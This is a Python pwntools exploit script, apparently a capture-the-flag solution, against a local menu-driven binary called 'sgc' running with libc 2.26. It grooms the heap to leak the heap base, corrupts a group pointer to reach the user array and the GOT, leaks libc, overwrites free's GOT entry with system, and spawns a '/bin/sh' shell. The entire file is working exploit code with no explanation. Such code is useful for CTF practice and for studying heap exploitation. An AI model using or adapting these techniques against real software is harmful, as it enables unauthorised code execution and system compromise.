from pwn import *

# context.log_level = "debug"

def addUser(name, group, age):
    r.sendlineafter("Action:", "0")
    r.sendlineafter("name:", name)
    r.sendlineafter("group:", group)
    r.sendlineafter("age:", str(age))

def displayGroup(groupName):
    r.sendlineafter("Action:", "1")
    r.sendlineafter("name:", groupName)

def displayUser(idx):
    r.sendlineafter("Action:", "2")
    r.sendlineafter("index:", str(idx))
    r.recvuntil("Group: ")
    return r.readline().strip()

def editGroup(idx, propogate, groupName):
    r.sendlineafter("Action:", "3")
    r.sendlineafter("index:", str(idx))
    r.sendlineafter("(y/n):", propogate)
    r.sendlineafter("name:", groupName)

def deleteUser(idx):
    r.sendlineafter("Action:", "4")
    r.sendlineafter("index:", str(idx))


userArr = 0x6020e0
free_got = 0x602018

r = process('./sgc')
e = ELF("./sgc_libc-2.26.so")

for i in range(9):
	addUser("A", "B"*i, 0)
gdb.attach(r)

editGroup(4,"y","B"*5)
# raw_input()
for i in range(5):
	deleteUser(i)

sleep(1)

heap_base = u64(displayUser(5).ljust(8, '\0')) - 0x590
log.success("heap_base at: "+hex(heap_base))

editGroup(5,"y", p64(userArr-0x10))
# raw_input()
editGroup(5, "n", "1-2")
editGroup(5, "n", "3-4")
editGroup(5, "n", "5-fastbin1")

payload = "/bin/sh\0"
payload += p64(userArr)
payload += p64(free_got)
editGroup(5, "n", payload)
# raw_input()

libc_free = u64(displayUser(1).ljust(8, '\0'))
libc_base = libc_free - e.symbols["free"]
log.success("libc_base at: "+hex(libc_base))

system_add = libc_base + e.symbols["system"]
editGroup(1, "y", p64(system_add))
raw_input()
deleteUser(1)

r.interactive()
